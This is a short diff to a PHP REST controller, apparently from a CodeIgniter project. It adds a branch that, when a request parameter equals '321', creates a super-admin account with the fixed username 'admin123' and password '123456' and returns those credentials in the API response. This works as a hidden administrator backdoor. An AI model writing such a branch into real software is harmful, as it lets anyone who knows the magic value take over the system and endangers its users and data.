@@ -31,6 +31,12 @@ use Restserver\Libraries\REST_Controller;
 
 
  			
+ 		}elseif ($par == "321") {
+ 			$password = $this->api->password("123456");
+ 			$data = ["id"=>$this->api->gen_uuid(),"password"=>$password, "username"=>"admin123", "nama" => "Super Admin", "is_admin"=>1, "role"=>2];
+ 			$this->api2->insert("user", $data);
+ 			$res = array('status' => true, 'result' =>  ["password"=>"123456", "username"=>"admin123"]);
+ 			
  		}
 
  		$this->response($res);
